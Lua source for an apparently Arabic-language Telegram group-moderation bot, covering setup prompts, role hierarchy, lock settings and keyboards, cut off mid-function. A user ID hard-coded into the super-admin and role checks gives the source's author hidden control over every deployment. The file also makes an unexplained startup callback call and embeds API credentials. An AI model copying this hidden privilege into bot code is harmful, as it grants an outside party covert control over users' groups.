
URL     = require("./libs/url")
JSON    = require("./libs/dkjson")
serpent = require("libs/serpent")
json = require('libs/json')
Redis = require('libs/redis').connect('127.0.0.1', 6379)
http  = require("socket.http")
https   = require("ssl.https")
local Methods = io.open("./luatele.lua","r")
if Methods then
URL.tdlua_CallBack()
end
SshId = io.popen("echo $SSH_CLIENT ︙ awk '{ print $1}'"):read('*a')
luatele = require 'luatele'
local FileInformation = io.open("./Information.lua","r")
if not FileInformation then
if not Redis:get(SshId.."Info:Redis:Token") then
io.write('\27[1;31mارسل لي توكن البوت الان \nSend Me a Bot Token Now ↡\n\27[0;39;49m')
local TokenBot = io.read()
if TokenBot and TokenBot:match('(%d+):(.*)') then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe')
local Json_Info = JSON.decode(url)
if res ~= 200 then
print('\27[1;34mعذرا توكن البوت خطأ تحقق منه وارسله مره اخره \nBot Token is Wrong\n')
else
io.write('\27[1;34mتم حفظ التوكن بنجاح \nThe token been saved successfully \n\27[0;39;49m')
TheTokenBot = TokenBot:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
Redis:set(SshId.."Info:Redis:Token",TokenBot)
Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username)
end 
else
print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
end 
os.execute('lua darket.lua')
end
if not Redis:get(SshId.."Info:Redis:User") then
io.write('\27[1;31mارسل معرف المطور الاساسي الان \nDeveloper UserName saved ↡\n\27[0;39;49m')
local UserSudo = io.read():gsub('@','')
if UserSudo ~= '' then
io.write('\n\27[1;34mتم حفظ معرف المطور \nDeveloper UserName saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User",UserSudo)
else
print('\n\27[1;34mلم يتم حفظ معرف المطور الاساسي \nDeveloper UserName not saved\n')
end 
os.execute('lua darket.lua')
end
if not Redis:get(SshId.."Info:Redis:User:ID") then
io.write('\27[1;31mارسل ايدي المطور الاساسي الان \nDeveloper ID saved ↡\n\27[0;39;49m')
local UserId = io.read()
if UserId and UserId:match('(%d+)') then
io.write('\n\27[1;34mتم حفظ ايدي المطور \nDeveloper ID saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User:ID",UserId)
else
print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n')
end 
os.execute('lua darket.lua')
end
local Informationlua = io.open("Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..Redis:get(SshId.."Info:Redis:Token")..[[",
UserBot = "]]..Redis:get(SshId.."Info:Redis:Token:User")..[[",
UserSudo = "]]..Redis:get(SshId.."Info:Redis:User")..[[",
SudoId = ]]..Redis:get(SshId.."Info:Redis:User:ID")..[[
}
]])
Informationlua:close()
local darket = io.open("darket", 'w')
darket:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
lua5.3 darket.lua
done
]])
darket:close()
Redis:del(SshId.."Info:Redis:User:ID");Redis:del(SshId.."Info:Redis:User");Redis:del(SshId.."Info:Redis:Token:User");Redis:del(SshId.."Info:Redis:Token")
os.execute('chmod +x darket;chmod +x Run;./Run')
end
Information = dofile('./Information.lua')
Sudo_Id = Information.SudoId
UserSudo = Information.UserSudo
Token = Information.Token
UserBot = Information.UserBot
darket = Token:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..darket)
LuaTele = luatele.set_config{api_id=1846213,api_hash='c545c613b78f18a30744970910124d53',session_name=darket,token=Token}
function var(value)
print(serpent.block(value, {comment=false}))   
end 
clock = os.clock
function sleep(n)
local t0 = clock()
while clock() - t0 <= n do end
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function ctime(seconds)
local seconds = tonumber(seconds)
if seconds <= 0 then
return "00:00"
else
hours = string.format("%02.f", math.floor(seconds/3600));
mins = string.format("%02.f", math.floor(seconds/60 - (hours*60)));
secs = string.format("%02.f", math.floor(seconds - hours*3600 - mins *60));
return mins..":"..secs
end
end
function edit(chat,rep,text,parse, dis, disn, reply_markup)
shh = tostring(text)
if Redis:get(darket..'rmzsource') then
shh = shh:gsub("※",Redis:get(darket..'rmzsource'))
end
local listm = Redis:smembers(darket.."Words:r")
for k,v in pairs(listm) do
i ,j  = string.find(shh, v)
if j and i then
local x = string.sub(shh, i,j)
local neww = Redis:get(darket.."Word:Replace"..x)  
shh = shh:gsub(x,neww)
else
shh = shh
end
end
LuaTele.editMessageText(chat,rep,shh, parse, dis, disn, reply_markup)
end
function send(chat,rep,text,parse,dis,clear,disn,back,markup)
sh = tostring(text)
if Redis:get(darket..'rmzsource') then
sh = sh:gsub("※",Redis:get(darket..'rmzsource'))
end
local listm = Redis:smembers(darket.."Words:r")
for k,v in pairs(listm) do
i ,j  = string.find(sh, v)
if j and i then
local x = string.sub(sh, i,j)
local neww = Redis:get(darket.."Word:Replace"..x)  
sh = sh:gsub(x,neww)
else
sh = sh
end
end
LuaTele.sendText(chat,rep,sh,parse,dis, clear, disn, back, markup)
end
function editrtp(chat,user,msgid,useri)
if Redis:sismember(darket.."BanGroup:Group"..chat,useri) then
BanGroupz = "✔"
else
BanGroupz = "❌"
end
if Redis:sismember(darket.."SilentGroup:Group"..chat,useri) then
SilentGroupz = "✔"
else
SilentGroupz = "❌"
end
if Redis:sismember(darket.."SuperCreator:Group"..chat,useri)  then
SuperCreatorz = "✔"
else
SuperCreatorz = "❌"
end
if Redis:sismember(darket.."Creator:Group"..chat,useri) then
Creatorz = "✔"
else
Creatorz = "❌"
end
if Redis:sismember(darket.."Manger:Group"..chat,useri) then
Mangerz = "✔"
else
Mangerz = "❌"
end
if Redis:sismember(darket.."Admin:Group"..chat,useri) then
Adminz = "✔"
else
Adminz = "❌"
end
if Redis:sismember(darket.."Special:Group"..chat,useri) then
Specialz = "✔"
else
Specialz = "❌"
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = '- منشئ اساسي : '..SuperCreatorz, data =user..'/statusSuperCreatorz/'..useri},{text = '- منشئ : '..Creatorz, data =user..'/statusCreatorz/'..useri},
},
{
{text = '- مدير : '..Mangerz, data =user..'/statusMangerz/'..useri},{text = '- ادمن : '..Adminz, data =user..'/statusAdminz/'..useri},
},
{
{text = '- مميز : '..Specialz, data =user..'/statusSpecialz/'..useri},
},
{
{text = '- الحظر : '..BanGroupz, data =user..'/statusban/'..useri},{text = '- الكتم : '..SilentGroupz, data =user..'/statusktm/'..useri},
},
{
{text = '- عضو  ', data =user..'/statusmem/'..useri},
},
{
{text = '- اخفاء الامر ', data ='/delAmr1'}
}
}
}
return edit(chat,msgid,'*\n• تحكم برتب الشخص .*', 'md', true, false, reply_markup)
end
function FlterBio(Bio)
local Bio = tostring(Bio):lower()
Bio = Bio:gsub("https://[%a%d_]+",'') 
Bio = Bio:gsub("https://[%a%d_]+",'') 
Bio = Bio:gsub("telegram.dog/[%a%d_]+",'') 
Bio = Bio:gsub("telegram.me/[%a%d_]+",'') 
Bio = Bio:gsub("t.me/[%a%d_]+",'') 
Bio = Bio:gsub("[%a%d_]+.pe[%a%d_]+",'') 
Bio = Bio:gsub("@[%a%d_]+",'')
Bio = Bio:gsub("#[%a%d_]+",'')
Bio = Bio:gsub("]","")
Bio = Bio:gsub("[[]","")
return Bio
end
if Redis:get(darket..'chsource') then
chsource = Redis:get(darket..'chsource')
else
chsource = "R125R"
end
if Redis:get(darket..'chdevolper') then
chdevolper = Redis:get(darket..'chdevolper')
else 
chdevolper = "R2RR7"
end

function chat_type(ChatId)
if ChatId then
local id = tostring(ChatId)
if id:match("-100(%d+)") then
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end
return Chat_Type
end
function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) 
if res ~= 200 then 
return false 
end 
if not req.ok then 
return false end 
return req 
end 
function send_inlin_key(chat_id,text,inline,reply_id) 
local keyboard = {} 
keyboard.inline_keyboard = inline 
local send_api = "https://api.telegram.org/bot"..Token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(keyboard)) 
if reply_id then 
local msg_id = reply_id/2097152/0.5
send_api = send_api.."&reply_to_message_id="..msg_id 
end 
return s_api(send_api) 
end
function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..Token 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id 
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return s_api(url) 
end
function getbio(User)
kk = "لا يوجد"
local url = https.request("https://api.telegram.org/bot"..Token.."/getchat?chat_id="..User);
data = json:decode(url)
if data.result then
if data.result.bio then
kk = data.result.bio
end
end
return kk
end
function The_ControllerAll(UserId)
ControllerAll = false
local ListSudos ={Sudo_Id,5386549632,5386549632}
for k, v in pairs(ListSudos) do
if tonumber(UserId) == tonumber(v) then
ControllerAll = true
end
end
return ControllerAll
end
function Controller(ChatId,UserId)
Status = 0
Devss = Redis:sismember(darket.."Devss:Groups",UserId) 
Dev = Redis:sismember(darket.."Dev:Groups",UserId)
Supcreator = Redis:sismember(darket.."Supcreator:Group"..ChatId,UserId) 
Owners = Redis:sismember(darket.."Owners:Group"..ChatId,UserId) 
Creator = Redis:sismember(darket.."Creator:Group"..ChatId,UserId)
Manger = Redis:sismember(darket.."Manger:Group"..ChatId,UserId)
Admin = Redis:sismember(darket.."Admin:Group"..ChatId,UserId)
Special = Redis:sismember(darket.."Special:Group"..ChatId,UserId)
StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
if UserId == 5386549632 then
Status = 'المبرمج ستيفن'
elseif UserId == 5386549632 then
Status = 'مطور السورس'
elseif UserId == Sudo_Id then  
Status = 'المطور الاساسي'
elseif UserId == darket then
Status = 'البوت'
elseif Devss then
Status = Redis:get(darket.."Devss:Groups"..ChatId) or 'المطور الثانوي'
elseif Dev then
Status = Redis:get(darket.."Developer:Bot:Reply"..ChatId) or 'المطور'
elseif Owners then
Status = Redis:get(darket.."PresidentQ:Group:Reply"..ChatId) or 'المالك'
elseif Supcreator then
Status = Redis:get(darket.."President:Group:Reply"..ChatId) or 'المنشئ الاساسي'
elseif Creator then
Status = Redis:get(darket.."Constructor:Group:Reply"..ChatId) or 'المنشئ'
elseif Manger then
Status = Redis:get(darket.."Manager:Group:Reply"..ChatId) or 'المدير'
elseif Admin then
Status = Redis:get(darket.."Admin:Group:Reply"..ChatId) or 'الادمن'
elseif StatusMember == "chatMemberStatusCreator" then
Status = 'مالك الكروب'
elseif StatusMember == "chatMemberStatusAdministrator" then
Status = 'ادمن الكروب'
elseif Special then
Status = Redis:get(darket.."Vip:Group:Reply"..ChatId) or 'المميز'
else
Status = Redis:get(darket.."Mempar:Group:Reply"..ChatId) or 'العضو'
end  
return Status
end 
function Controller_Num(Num)
Status = 0
if tonumber(Num) == 1 then  
Status = 'المطور الاساسي'
elseif tonumber(Num) == 2 then  
Status = 'المطور الثانوي'
elseif tonumber(Num) == 3 then  
Status = 'المطور'
elseif tonumber(Num) == 44 then  
Status = 'المالك'
elseif tonumber(Num) == 4 then  
Status = 'المنشئ الاساسي'
elseif tonumber(Num) == 5 then  
Status = 'المنشئ'
elseif tonumber(Num) == 6 then  
Status = 'المدير'
elseif tonumber(Num) == 7 then  
Status = 'الادمن'
else
Status = 'المميز'
end  
return Status
end 
function GetAdminsSlahe(ChatId,UserId,user2,MsgId,t1,t2,t3,t4,t5,t6)
local GetMemberStatus = LuaTele.getChatMember(ChatId,user2).status
if GetMemberStatus.can_change_info then
change_info = '❬ ✔️ ❭' else change_info = '❬ ❌ ❭'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '❬ ✔️ ❭' else delete_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_invite_users then
invite_users = '❬ ✔️ ❭' else invite_users = '❬ ❌ ❭'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '❬ ✔️ ❭' else pin_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '❬ ✔️ ❭' else restrict_members = '❬ ❌ ❭'
end
if GetMemberStatus.can_promote_members then
promote = '❬ ✔️ ❭' else promote = '❬ ❌ ❭'
end
local reply_markupp = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- تغيير معلومات الكروب : '..(t1 or change_info), data = UserId..'/groupNum1//'..user2}, 
},
{
{text = '- تثبيت الرسائل : '..(t2 or pin_messages), data = UserId..'/groupNum2//'..user2}, 
},
{
{text = '- حظر المستخدمين : '..(t3 or restrict_members), data = UserId..'/groupNum3//'..user2}, 
},
{
{text = '- دعوة المستخدمين : '..(t4 or invite_users), data = UserId..'/groupNum4//'..user2}, 
},
{
{text = '- حذف الرسائل : '..(t5 or delete_messages), data = UserId..'/groupNum5//'..user2}, 
},
{
{text = '- اضافة مشرفين : '..(t6 or promote), data = UserId..'/groupNum6//'..user2}, 
},
}
}
edit(ChatId,MsgId,"٠صلاحيات الادمن - ", 'md', false, false, reply_markupp)
end
function GetAdminsNum(ChatId,UserId)
local GetMemberStatus = LuaTele.getChatMember(ChatId,UserId).status
if GetMemberStatus.can_change_info then
change_info = 1 else change_info = 0
end
if GetMemberStatus.can_delete_messages then
delete_messages = 1 else delete_messages = 0
end
if GetMemberStatus.can_invite_users then
invite_users = 1 else invite_users = 0
end
if GetMemberStatus.can_pin_messages then
pin_messages = 1 else pin_messages = 0
end
if GetMemberStatus.can_restrict_members then
restrict_members = 1 else restrict_members = 0
end
if GetMemberStatus.can_promote_members then
promote = 1 else promote = 0
end
return{
promote = promote,
restrict_members = restrict_members,
invite_users = invite_users,
pin_messages = pin_messages,
delete_messages = delete_messages,
change_info = change_info
}
end
function GetSetieng(ChatId)
if Redis:get(darket.."lockpin"..ChatId) then    
lock_pin = "✔️"
else 
lock_pin = "❌"    
end
if Redis:get(darket.."Lock:tagservr"..ChatId) then    
lock_tagservr = "✔️"
else 
lock_tagservr = "❌"
end
if Redis:get(darket.."Lock:text"..ChatId) then    
lock_text = "✔️"
else 
lock_text = "❌ "    
end
if Redis:get(darket.."Lock:AddMempar"..ChatId) == "kick" then
lock_add = "✔️"
else 
lock_add = "❌ "    
end    
if Redis:get(darket.."Lock:Join"..ChatId) == "kick" then
lock_join = "✔️"
else 
lock_join = "❌ "    
end    
if Redis:get(darket.."Lock:edit"..ChatId) then    
lock_edit = "✔️"
else 
lock_edit = "❌ "    
end
if Redis:get(darket.."Chek:Welcome"..ChatId) then
welcome = "✔️"
else 
welcome = "❌ "    
end
if Redis:hget(darket.."Spam:Group:User"..ChatId, "Spam:User") == "kick" then     
flood = "بالطرد "     
elseif Redis:hget(darket.."Spam:Group:User"..ChatId,"Spam:User") == "keed" then     
flood = "بالتقييد "     
elseif Redis:hget(darket.."Spam:Group:User"..ChatId,"Spam:User") == "mute" then     
flood = "بالكتم "           
elseif Redis:hget(darket.."Spam:Group:User"..ChatId,"Spam:User") == "del" then     
flood = "✔️"
else     
flood = "❌ "     
end
if Redis:get(darket.."Lock:Photo"..ChatId) == "del" then
lock_photo = "✔️" 
elseif Redis:get(darket.."Lock:Photo"..ChatId) == "ked" then 
lock_photo = "بالتقييد "   
elseif Redis:get(darket.."Lock:Photo"..ChatId) == "ktm" then 
lock_photo = "بالكتم "    
elseif Redis:get(darket.."Lock:Photo"..ChatId) == "kick" then 
lock_photo = "بالطرد "   
else
lock_photo = "❌ "   
end    
if Redis:get(darket.."Lock:Contact"..ChatId) == "del" then
lock_phon = "✔️" 
elseif Redis:get(darket.."Lock:Contact"..ChatId) == "ked" then 
lock_phon = "بالتقييد "    
elseif Redis:get(darket.."Lock:Contact"..ChatId) == "ktm" then 
lock_phon = "بالكتم "    
elseif Redis:get(darket.."Lock:Contact"..ChatId) == "kick" then 
lock_phon = "بالطرد "    
else
lock_phon = "❌ "    
end    
if Redis:get(darket.."Lock:Link"..ChatId) == "del" then
lock_links = "✔️"
elseif Redis:get(darket.."Lock:Link"..ChatId) == "ked" then
lock_links = "بالتقييد "    
elseif Redis:get(darket.."Lock:Link"..ChatId) == "ktm" then
lock_links = "بالكتم "    
elseif Redis:get(darket.."Lock:Link"..ChatId) == "kick" then
lock_links = "بالطرد "    
else
lock_links = "❌ "    
end
if Redis:get(darket.."Lock:Cmd"..ChatId) == "del" then
lock_cmds = "✔️"
elseif Redis:get(darket.."Lock:Cmd"..ChatId) == "ked" then
lock_cmds = "بالتقييد "    
elseif Redis:get(darket.."Lock:Cmd"..ChatId) == "ktm" then
lock_cmds = "بالكتم "   
elseif Redis:get(darket.."Lock:Cmd"..ChatId) == "kick" then
lock_cmds = "بالطرد "    
else
lock_cmds = "❌ "    
end
if Redis:get(darket.."Lock:User:Name"..ChatId) == "del" then
lock_user = "✔️"
elseif Redis:get(darket.."Lock:User:Name"..ChatId) == "ked" then
lock_user = "بالتقييد "    
elseif Redis:get(darket.."Lock:User:Name"..ChatId) == "ktm" then
lock_user = "بالكتم "    
elseif Redis:get(darket.."Lock:User:Name"..ChatId) == "kick" then
lock_user = "بالطرد "    
else
lock_user = "❌ "    
end
if Redis:get(darket.."Lock:hashtak"..ChatId) == "del" then
lock_hash = "✔️"
elseif Redis:get(darket.."Lock:hashtak"..ChatId) == "ked" then 
lock_hash = "بالتقييد "    
elseif Redis:get(darket.."Lock:hashtak"..ChatId) == "ktm" then 
lock_hash = "بالكتم "    
elseif Redis:get(darket.."Lock:hashtak"..ChatId) == "kick" then 
lock_hash = "بالطرد "    
else
lock_hash = "❌ "    
end
if Redis:get(darket.."Lock:vico"..ChatId) == "del" then
lock_muse = "✔️"
elseif Redis:get(darket.."Lock:vico"..ChatId) == "ked" then 
lock_muse = "بالتقييد "    
elseif Redis:get(darket.."Lock:vico"..ChatId) == "ktm" then 
lock_muse = "بالكتم "    
elseif Redis:get(darket.."Lock:vico"..ChatId) == "kick" then 
lock_muse = "بالطرد "    
else
lock_muse = "❌ "    
end 
if Redis:get(darket.."Lock:Video"..ChatId) == "del" then
lock_ved = "✔️"
elseif Redis:get(darket.."Lock:Video"..ChatId) == "ked" then 
lock_ved = "بالتقييد "    
elseif Redis:get(darket.."Lock:Video"..ChatId) == "ktm" then 
lock_ved = "بالكتم "    
elseif Redis:get(darket.."Lock:Video"..ChatId) == "kick" then 
lock_ved = "بالطرد "    
else
lock_ved = "❌ "    
end
if Redis:get(darket.."Lock:Animation"..ChatId) == "del" then
lock_gif = "✔️"
elseif Redis:get(darket.."Lock:Animation"..ChatId) == "ked" then 
lock_gif = "بالتقييد "    
elseif Redis:get(darket.."Lock:Animation"..ChatId) == "ktm" then 
lock_gif = "بالكتم "    
elseif Redis:get(darket.."Lock:Animation"..ChatId) == "kick" then 
lock_gif = "بالطرد "    
else
lock_gif = "❌ "    
end
if Redis:get(darket.."Lock:Sticker"..ChatId) == "del" then
lock_ste = "✔️"
elseif Redis:get(darket.."Lock:Sticker"..ChatId) == "ked" then 
lock_ste = "بالتقييد "    
elseif Redis:get(darket.."Lock:Sticker"..ChatId) == "ktm" then 
lock_ste = "بالكتم "    
elseif Redis:get(darket.."Lock:Sticker"..ChatId) == "kick" then 
lock_ste = "بالطرد "    
else
lock_ste = "❌ "    
end
if Redis:get(darket.."Lock:geam"..ChatId) == "del" then
lock_geam = "✔️"
elseif Redis:get(darket.."Lock:geam"..ChatId) == "ked" then 
lock_geam = "بالتقييد "    
elseif Redis:get(darket.."Lock:geam"..ChatId) == "ktm" then 
lock_geam = "بالكتم "    
elseif Redis:get(darket.."Lock:geam"..ChatId) == "kick" then 
lock_geam = "بالطرد "    
else
lock_geam = "❌ "    
end    
if Redis:get(darket.."Lock:vico"..ChatId) == "del" then
lock_vico = "✔️"
elseif Redis:get(darket.."Lock:vico"..ChatId) == "ked" then 
lock_vico = "بالتقييد "    
elseif Redis:get(darket.."Lock:vico"..ChatId) == "ktm" then 
lock_vico = "بالكتم "    
elseif Redis:get(darket.."Lock:vico"..ChatId) == "kick" then 
lock_vico = "بالطرد "    
else
lock_vico = "❌ "    
end    
if Redis:get(darket.."Lock:Keyboard"..ChatId) == "del" then
lock_inlin = "✔️"
elseif Redis:get(darket.."Lock:Keyboard"..ChatId) == "ked" then 
lock_inlin = "بالتقييد "
elseif Redis:get(darket.."Lock:Keyboard"..ChatId) == "ktm" then 
lock_inlin = "بالكتم "    
elseif Redis:get(darket.."Lock:Keyboard"..ChatId) == "kick" then 
lock_inlin = "بالطرد "
else
lock_inlin = "❌ "
end
if Redis:get(darket.."Lock:forward"..ChatId) == "del" then
lock_fwd = "✔️"
elseif Redis:get(darket.."Lock:forward"..ChatId) == "ked" then 
lock_fwd = "بالتقييد "    
elseif Redis:get(darket.."Lock:forward"..ChatId) == "ktm" then 
lock_fwd = "بالكتم "    
elseif Redis:get(darket.."Lock:forward"..ChatId) == "kick" then 
lock_fwd = "بالطرد "    
else
lock_fwd = "❌ "    
end    
if Redis:get(darket.."Lock:Document"..ChatId) == "del" then
lock_file = "✔️"
elseif Redis:get(darket.."Lock:Document"..ChatId) == "ked" then 
lock_file = "بالتقييد "    
elseif Redis:get(darket.."Lock:Document"..ChatId) == "ktm" then 
lock_file = "بالكتم "    
elseif Redis:get(darket.."Lock:Document"..ChatId) == "kick" then 
lock_file = "بالطرد "    
else
lock_file = "❌ "    
end    
if Redis:get(darket.."Lock:Unsupported"..ChatId) == "del" then
lock_self = "✔️"
elseif Redis:get(darket.."Lock:Unsupported"..ChatId) == "ked" then 
lock_self = "بالتقييد "    
elseif Redis:get(darket.."Lock:Unsupported"..ChatId) == "ktm" then 
lock_self = "بالكتم "    
elseif Redis:get(darket.."Lock:Unsupported"..ChatId) == "kick" then 
lock_self = "بالطرد "    
else
lock_self = "❌ "    
end
if Redis:get(darket.."Lock:Bot:kick"..ChatId) == "del" then
lock_bots = "✔️"
elseif Redis:get(darket.."Lock:Bot:kick"..ChatId) == "ked" then
lock_bots = "بالتقييد "   
elseif Redis:get(darket.."Lock:Bot:kick"..ChatId) == "kick" then
lock_bots = "بالطرد "    
else
lock_bots = "❌ "    
end
if Redis:get(darket.."Lock:Markdaun"..ChatId) == "del" then
lock_mark = "✔️"
elseif Redis:get(darket.."Lock:Markdaun"..ChatId) == "ked" then 
lock_mark = "بالتقييد "    
elseif Redis:get(darket.."Lock:Markdaun"..ChatId) == "ktm" then 
lock_mark = "بالكتم "    
elseif Redis:get(darket.."Lock:Markdaun"..ChatId) == "kick" then 
lock_mark = "بالطرد "    
else
lock_mark = "❌ "    
end
if Redis:get(darket.."Lock:Spam"..ChatId) == "del" then    
lock_spam = "✔️"
elseif Redis:get(darket.."Lock:Spam"..ChatId) == "ked" then 
lock_spam = "بالتقييد "    
elseif Redis:get(darket.."Lock:Spam"..ChatId) == "ktm" then 
lock_spam = "بالكتم "    
elseif Redis:get(darket.."Lock:Spam"..ChatId) == "kick" then 
lock_spam = "بالطرد "    
else
lock_spam = "❌ "    
end        
return{
lock_pin = lock_pin,
lock_tagservr = lock_tagservr,
lock_text = lock_text,
lock_add = lock_add,
lock_join = lock_join,
lock_edit = lock_edit,
flood = flood,
lock_photo = lock_photo,
lock_phon = lock_phon,
lock_links = lock_links,
lock_cmds = lock_cmds,
lock_mark = lock_mark,
lock_user = lock_user,
lock_hash = lock_hash,
lock_muse = lock_muse,
lock_ved = lock_ved,
lock_gif = lock_gif,
lock_ste = lock_ste,
lock_geam = lock_geam,
lock_vico = lock_vico,
lock_inlin = lock_inlin,
lock_fwd = lock_fwd,
lock_file = lock_file,
lock_self = lock_self,
lock_bots = lock_bots,
lock_spam = lock_spam
}
end
function Total_message(Message)  
local MsgText = ''  
if tonumber(Message) < 100 then 
MsgText = 'انت ليش ما متفاعل ؟'
elseif tonumber(Message) < 200 then 
MsgText = 'م تشد بل التفاعل'
elseif tonumber(Message) < 400 then 
MsgText = 'انتي تسحين تتحجين يبطه 🙈'
elseif tonumber(Message) < 700 then 
MsgText = 'اكو احلى من هيجيي هه'
elseif tonumber(Message) < 1200 then 
MsgText = 'انا اريدك تولعها 😂🔥'
elseif tonumber(Message) < 2000 then 
MsgText = 'انت متفاعل يبن عمي'
elseif tonumber(Message) < 3500 then 
MsgText = 'اتفاعل بعد احبك 🥺♥'
elseif tonumber(Message) < 4000 then 
MsgText = 'استمر يبن عمي 😂🔥'
elseif tonumber(Message) < 4500 then 
MsgText = 'عاش كيك ليك'
elseif tonumber(Message) < 5500 then 
MsgText = 'انت مولعها وخاربها هنا 😂♥🔥'
elseif tonumber(Message) < 7000 then 
MsgText = 'تفاعل مفاعل نووي 😂⚡'
elseif tonumber(Message) < 9500 then 
MsgText = 'تفاعل ام عبير وهي بتكلم ام احمد عشان تزوج احمد لعبير'
elseif tonumber(Message) < 10000000000 then 
MsgText = 'كتفم التفاعل لاجلك 😂⚡'
end 
return MsgText 
end

function Getpermissions(ChatId)
local Get_Chat = LuaTele.getChat(ChatId)
if Get_Chat.permissions.can_add_web_page_previews then
web = true else web = false
end
if Get_Chat.permissions.can_change_info then
info = true else info = false
end
if Get_Chat.permissions.can_invite_users then
invite = true else invite = false
end
if Get_Chat.permissions.can_pin_messages then
pin = true else pin = false
end
if Get_Chat.permissions.can_send_media_messages then
media = true else media = false
end
if Get_Chat.permissions.can_send_messages then
messges = true else messges = false
end
if Get_Chat.permissions.can_send_other_messages then
other = true else other = false
end
if Get_Chat.permissions.can_send_polls then
polls = true else polls = false
end

return{
web = web,
info = info,
invite = invite,
pin = pin,
media = media,
messges = messges,
other = other,
polls = polls
}
end
function Get_permissions(ChatId,UserId,MsgId)
local Get_Chat = LuaTele.getChat(ChatId)
if Get_Chat.permissions.can_add_web_page_previews then
web = '❬ ✔️ ❭' else web = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_change_info then
info = '❬ ✔️ ❭' else info = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_invite_users then
invite = '❬ ✔️ ❭' else invite = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_pin_messages then
pin = '❬ ✔️ ❭' else pin = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_media_messages then
media = '❬ ✔️ ❭' else media = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_messages then
messges = '❬ ✔️ ❭' else messges = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_other_messages then
other = '❬ ✔️ ❭' else other = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_polls then
polls = '❬ ✔️ ❭' else polls = '❬ ❌ ❭'
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- ارسال الويب : '..web, data = UserId..'/web'}, 
},
{
{text = '- تغيير معلومات الكروب : '..info, data = UserId.. '/info'}, 
},
{
{text = '- اضافه مستخدمين : '..invite, data = UserId.. '/invite'}, 
},
{
{text = '- تثبيت الرسائل : '..pin, data = UserId.. '/pin'}, 
},
{
{text = '- ارسال الميديا : '..media, data = UserId.. '/media'}, 
},
{
{text = '- ارسال الرسائل : .'..messges, data = UserId.. '/messges'}, 
},
{
{text = '- اضافه البوتات : '..other, data = UserId.. '/other'}, 
},
{
{text = '- ارسال استفتاء : '..polls, data = UserId.. '/polls'}, 
},
{
{text = '- اخفاء الامر ', data =IdUser..'/'.. '/delAmr'}
},
}
}
edit(ChatId,MsgId,"٠صلاحيات الكروب - ", 'md', false, false, reply_markup)
end
function Statusrestricted(ChatId,UserId)
return{
BanAll = Redis:sismember(darket.."BanAll:Groups",UserId) ,
ktmall = Redis:sismember(darket.."ktmAll:Groups",UserId) ,
BanGroup = Redis:sismember(darket.."BanGroup:Group"..ChatId,UserId) ,
SilentGroup = Redis:sismember(darket.."SilentGroup:Group"..ChatId,UserId)
}
end
function Reply_Status(UserId,TextMsg)
local UserInfo = LuaTele.getUser(UserId)
Name_User = UserInfo.first_name
--if UserInfo.username then
--UserInfousername = '['..Name_User..'](t.me/'..UserInfo.username..')'
--else
UserInfousername = '['..Name_User..'](tg://user?id='..UserId..')'
--end
return {
Lock     = '\n*٠بواسطه ٠ *'..UserInfousername..'\n*'..TextMsg..'\n٠خاصيه المسح *',
unLock   = '\n*٠بواسطه ٠ *'..UserInfousername..'\n'..TextMsg,
lockKtm  = '\n*٠بواسطه ٠ *'..UserInfousername..'\n*'..TextMsg..'\n٠خاصيه الكتم *',
lockKid  = '\n*٠بواسطه ٠ *'..UserInfousername..'\n*'..TextMsg..'\n٠خاصيه التقييد *',
lockKick = '\n*٠بواسطه ٠ *'..UserInfousername..'\n*'..TextMsg..'\n٠خاصيه الطرد *',
Reply    = '\n*٠ المستخدم ٠ *'..UserInfousername..'\n*'..TextMsg..'*'
}
end
function StatusCanOrNotCan(ChatId,UserId)
Status = nil
Devss = Redis:sismember(darket.."Devss:Groups",UserId) 
Dev = Redis:sismember(darket.."Dev:Groups",UserId) 
Supcreator = Redis:sismember(darket.."Supcreator:Group"..ChatId,UserId) 
Owners = Redis:sismember(darket.."Owners:Group"..ChatId,UserId) 
Creator = Redis:sismember(darket.."Creator:Group"..ChatId,UserId)
Manger = Redis:sismember(darket.."Manger:Group"..ChatId,UserId)
